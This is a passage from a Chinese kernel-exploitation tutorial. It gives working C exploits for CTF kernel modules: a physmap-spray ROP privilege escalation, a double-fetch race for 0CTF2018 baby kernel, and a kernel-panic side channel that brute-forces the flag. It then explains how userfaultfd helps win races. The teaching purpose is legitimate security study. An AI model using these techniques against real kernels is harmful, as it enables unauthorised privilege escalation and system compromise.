class="hljs-function"></span>&#123;<br>    saveStatus();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;dev fd!&quot;</span>);<br><br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-comment">// construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    constructROPChain(physmap_spray_arr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">// spray physmap, so that we can easily hit one of them</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>            errExit(<span class="hljs-string">&quot;oom for physmap spray!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger physmap one_gadget...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br><br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="hljs-comment">// stack migration again</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   dev_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可稳定提权</p><p><a href="https://s2.loli.net/2022/05/07/HdjzW6RvGfOtqPk.png"><img src="https://s2.loli.net/2022/05/07/HdjzW6RvGfOtqPk.png" alt="image.png"></a></p><h1 id="条件竞争（Race-condition）"><a href="#条件竞争（Race-condition）" class="headerlink" title="条件竞争（Race condition）"></a>条件竞争（Race condition）</h1><p>通常情况下在用户态下的 pwn 当中我们只有一个独立运行的主线程，并不存在所谓条件竞争的情况，但在 kernel pwn 当中<strong>由攻击者负责编写用户态程序，可以很轻易地启动多个线程同时运行</strong>，从而轻易地产生条件竞争</p><blockquote><p>不过近年来随着 glibc pwn 的套路逐渐挖掘殆尽，用户态下的 pwn 题也开始逐渐脱离 glibc 本身的利用而向多个其他方向发展，其中一个热门方向便是用户态下多线程造成条件竞争</p><blockquote><p>还有一个逐渐热门的方向便是 musl C 堆利用</p></blockquote></blockquote><h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><p><code>double fetch</code> 直译就是 <code>取值两次</code>，直接理解就是在一次操作当中要<strong>两次（或是多次）重新获取某个对象的值</strong>，可能出现在下面这种情况当中：</p><ul><li>有一大段数据要从用户空间传给内核空间，但是直接传送整块数据会造成较大的开销，故选择<strong>只向内核传送一个指向用户地址空间的指针</strong></li><li>在后续的操作当中内核需要<strong>多次</strong>通过该指针获取到用户空间的数据</li></ul><p>例如：内核第一次先获取数据进行合法性验证，第二次再获取数据进行使用（如下图所示）</p><p><a href="https://i.loli.net/2021/09/08/pqLSVaINQ3zAsmO.png"><img src="https://i.loli.net/2021/09/08/pqLSVaINQ3zAsmO.png" alt="img"></a></p><p>不难看出，若是整个操作流程过长，则用户进程便有机会修改这一块数据，<strong>使得内核在两次访问这块空间时所获得的数据不一致，从而使得内核进入不同的执行流程</strong>，用户进程甚至可以<strong>直接开新的线程进行竞争来实现这个效果</strong></p><p><a href="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png"><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" alt="img"></a></p><p>通过在 first fetch 与 second fetch 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code></p><h3 id="例题：0CTF2018-Final-baby-kernel"><a href="#例题：0CTF2018-Final-baby-kernel" class="headerlink" title="例题：0CTF2018 Final - baby kernel"></a>例题：0CTF2018 Final - baby kernel</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>首先查看启动脚本，基本没开额外的保护</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \<br>-cpu qemu64 \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><p>解压文件系统，发现可疑驱动文件 <code>baby.ko</code>，惯例地 <code>checksec</code>，只开了 NX</p><p><a href="https://i.loli.net/2021/09/07/HkD2ygAPvb9BMSu.png"><img src="https://s2.loli.net/2023/02/06/vC8DsxV1RELNfOq.png" alt="image.png"></a></p><p>拖入 IDA 进行分析，只简单地定义了一个 ioctl</p><p><a href="https://i.loli.net/2021/09/07/Czo7jDP5YyXUKhr.png"><img src="https://s2.loli.net/2023/02/06/QhHVY7tb18j6f9F.png" alt="image.png"></a></p><p>其中参数 <code>0x6666</code> 可以获得 flag 在内核中的地址，参数 <code>0x1337</code> 则会将我们传入的 flag 与真正的 flag 进行对比，若正确则会将 flag 打印出来</p><p>测试一下，<code>dmesg</code> 权限开了，整挺好</p><p><a href="https://i.loli.net/2021/09/08/Q8Hyg4jGnSok2tW.png"><img src="https://s2.loli.net/2023/02/06/X7Ji4CRyONTMZ3Q.png" alt="image.png"></a></p><p>简单分析可知我们应当传入如下结构体：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * flag_addr;<br>    <span class="hljs-keyword">int</span> flag_len;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>其中 <code>flag_len</code> 参数与 flag 的长度对比，在 .ko 文件中 flag 的长度为 33</p><p>在 <code>0x1337</code> 功能当中还会通过 <code>_chk_range_not_ok()</code> 函数检查我们传入的地址范围是否合法：</p><p><a href="https://i.loli.net/2021/09/08/QjFdxAHLOTkctUB.png"><img src="https://s2.loli.net/2023/02/06/dWXwlmEyQAV1ZYf.png" alt="image.png"></a></p><p>add 指令会影响 CF（产生进位/借位）和 OF（两数最高位相同，结果最高位改变）标志位，v3获得的就是两数相加的 CF 位，这里一般为0（除非你传入 <code>0xffffffffffffffff</code> 附近的数），所以我们直接看另一个判断：a3 是否小于 v4</p><p>a3 为 current_task 的地址加上 0x1358 处所存地址，大概是 <code>task_struct-&gt;thread-&gt;fpu-&gt;state</code> 这个联合体内的某个位置上存的一个值，而 v4 则是我们传入的 flag 最后一个字节的地址，即我们传入的 flag 的地址不能够大于这个值</p><p>切 root 调一下我们可以发现这个值为 <code>0x7ffffffff000</code></p><p><a href="https://i.loli.net/2021/09/08/WFU9rzp1vSaR3hP.png"><img src="https://s2.loli.net/2023/02/06/n4BMChKeRb9cyfl.png" alt="image.png"></a></p><p>这个位置刚好是用户地址空间的栈底，即我们传入的 flag 的地址不能为用户地址空间外的地址</p><p><a href="https://i.loli.net/2021/09/08/tJ7uiEhCG4acbsd.png"><img src="https://s2.loli.net/2023/02/06/tNEsfPCaXxmWZhB.png" alt="image.png"></a></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>虽然 flag 存储的地址已知，但是位于内核地址空间当中，我们将之直接传给模块并不能通过验证，那么这里就考虑 double fetch——先传入一个用户地址空间上的合法地址，开另一个线程进行竞争不断修改其为内核空间 flag 的地址，只要有一次命中我们便能获得 flag</p><p><a href="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png"><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" alt="img"></a></p><p>exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">pthread_t</span> compete_thread;<br><span class="hljs-keyword">void</span> * real_addr;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x20</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>;<br><span class="hljs-keyword">int</span> competetion_times = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * flag_addr;<br>    <span class="hljs-keyword">int</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">competetionThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>            flag.flag_addr = real_addr;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd, result_fd, addr_fd;<br>    <span class="hljs-keyword">char</span> * temp, *flag_addr_addr;<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    ioctl(fd, <span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>    temp = (<span class="hljs-keyword">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);    <br>    addr_fd = open(<span class="hljs-string">&quot;./addr.txt&quot;</span>, O_RDONLY);<br>    temp[read(addr_fd, temp, <span class="hljs-number">0x100</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    flag_addr_addr = <span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;Your flag is at &quot;</span>) + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);<br>    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="hljs-number">16</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] flag addr: %llx&quot;</span>, real_addr);<br><br>    pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>        &#123;<br>            flag.flag_addr = buf;<br>            ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>        result_fd = open(<span class="hljs-string">&quot;./result.txt&quot;</span>, O_RDONLY);<br>        read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status = <span class="hljs-number">0</span>;<br>    &#125;<br>    pthread_cancel(compete_thread);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] competetion end!&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即得 flag</p><p><a href="https://i.loli.net/2021/09/08/NIrbAYh8UklgEsc.png"><img src="https://s2.loli.net/2023/02/06/3lWDCjP8ahfwYRI.png" alt="image.png"></a></p><blockquote><p>笔者原本想用 fscanf 读入 flag 地址，但是不明原因一直不能成功，然后又换了 sscanf 也不能成功…最后只好换了 strtoull …</p></blockquote><blockquote><h4 id="extra：测信道攻击"><a href="#extra：测信道攻击" class="headerlink" title="extra：测信道攻击"></a>extra：测信道攻击</h4><p>在进行比对时并没有检验 flag 地址的合法性，考虑如下内存布局：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                     flag&#123;...X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><p>我们将 flag 放在通过 mmap 分配而来的内存页的末尾，其最后一个字符 <code>X</code> 是我们将要爆破的未知字符</p><p>对于待比对字符 <code>X</code> 而言，若是比对失败则 ioctl 会直接返回，若是比对成功则指针移动到下一张内存页中进行解引用，<strong>此时将会直接造成 kernel panic</strong></p><p>由于 flag 被硬编码在 <code>.ko</code> 文件中，故通过是否造成 kernel panic 可以逐字符爆破 flag 内容</p><p>ASCII 可见字符 95 个，flag 长度 33，开头 <code>flag&#123;</code> 末尾 <code>&#125;</code> 减去6个字符，最多只需要爆破 <strong>26 * 95 = 2470</strong> 次便能够获得 flag</p><p>比较需要耐心（因为打远程传文件很麻烦），这里附上一个比较方便的 exp，不用每次打都重新编译一次，只需要将 flag 作为参数传进去就行了：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br> <span class="hljs-keyword">char</span> * flag_addr;<br> <span class="hljs-keyword">int</span> flag_len;<br>   &#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-keyword">int</span> fd, flag_len;<br> <span class="hljs-keyword">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br> buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>比如说这里的测试 flag 是 <code>flag&#123;THIS_IS_A_FLAG_1234&#125;</code>，如下图所示，我们成功通过 kernel panic 得知 flag 的第一个字符为 <code>T</code></p><p><a href="https://i.loli.net/2021/09/08/F1IRZwUh2ix7SGL.png"><img src="https://s2.loli.net/2023/02/06/YGug3blstjnLATk.png" alt="img"></a></p><p>当然，若是能够优化成纯汇编代码，可执行文件的体积将能够再缩小一个档次，大大降低爆破次数，笔者比较懒，这里便不再给出优化后的汇编代码</p><blockquote><p>当然，不到万不得已基本上不会用这种累死人的方法</p></blockquote></blockquote><h2 id="userfaultfd（may-obsolete）"><a href="#userfaultfd（may-obsolete）" class="headerlink" title="userfaultfd（may obsolete）"></a><em>userfaultfd（may obsolete）</em></h2><h3 id="userfaultfd-与条件竞争"><a href="#userfaultfd-与条件竞争" class="headerlink" title="userfaultfd 与条件竞争"></a>userfaultfd 与条件竞争</h3><p>严格意义而言 userfaultfd 并非是一种利用手法，<strong>而是 Linux 的一个系统调用</strong>，简单来说，通过 userfaultfd 这种机制，<strong>用户可以通过自定义的 page fault handler 在用户态处理缺页异常</strong></p><p>下面的这张图很好地体现了 userfaultfd 的整个流程：</p><p><a href="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png"><img src="https://s2.loli.net/2023/02/06/79S6DiYJaT4yV8p.png" alt="image.png"></a></p><p>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询<strong>直到出现缺页异常</strong></p><ul><li>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常</li><li>内核会调用 <code>handle_userfault()</code> 交由 userfaultfd 处理</li><li>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 monitor 线程，等待其处理结束</li><li>monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：<ul><li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 faulting page 上</li><li><code>UFFDIO_ZEROPAGE</code> ：将 faulting page 置0</li><li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充</li></ul></li><li>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</li></ul><p>以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机/进程的迁移等用途，但是<strong>通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong></p><p>考虑在内核模块当中有一个菜单堆的情况，其中的操作都没有加锁，那么便存在条件竞争的可能，考虑如下竞争情况：</p><ul><li>线程1不断地分配与编辑堆块</li><li>线程2不断地释放堆块</li></ul><p>此时线程1便<strong>有可能编辑到被释放的堆块</strong>，若是此时恰好我们又将这个堆块申请到了合适的位置（比如说 tty_operations），那么我们便可以完成对该堆块的重写，从而进行下一步利用</p><p>但是毫无疑问的是，若是直接开两个线程进行竞争，命中的几率是比较低的，我们也很难判断是否命中</p><p>但假如线程1使用诸如 <code>copy_from_user</code> 、<code>copy_to_user</code> 等方法在用户空间与内核空间之间拷贝数据，那么我们便可以：</p><ul><li>先用 mmap 分一块匿名内存，为其注册 userfaultfd，由于我们是使用 mmap 分配的匿名内存，此时该块内存并没有实际分配物理内存页</li><li>线程1在内核中在这块内存与内核对象间进行数据拷贝，<strong>在访问注册了 userfaultfd 内存时便会触发缺页异常，陷入阻塞，控制权转交 userfaultfd 的 uffd monitor 线程</strong></li><li><strong>在 uffd monitor 线程中我们便能对线程1正在操作的内核对象进行恶意操作</strong>（例如覆写线程1正在读写的内核对象，或是将线程1正在读写的内核对象释放掉后再分配到我们想要的地方）</li><li>此时再让线程1继续执行，线程 1 便会<strong>向我们想要写入的目标写入特定数据/从我们想要读取的目标读取特定数据</strong>了</li></ul><p>由此，我们便成功利用 userfaultfd 完成了对条件竞争漏洞的利用，这项技术的存在使得条件竞争的命中率大幅提高</p><h3 id="userfaultfd-的具体用法"><a href="#userfaultfd-的具体用法" class="headerlink" title="userfaultfd 的具体用法"></a>userfaultfd 的具体用法</h3><blockquote><p>以下代码参考自 Linux man page，略有改动</p></blockquote><p>首先定义接下来需要用到的一些数据结构</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span 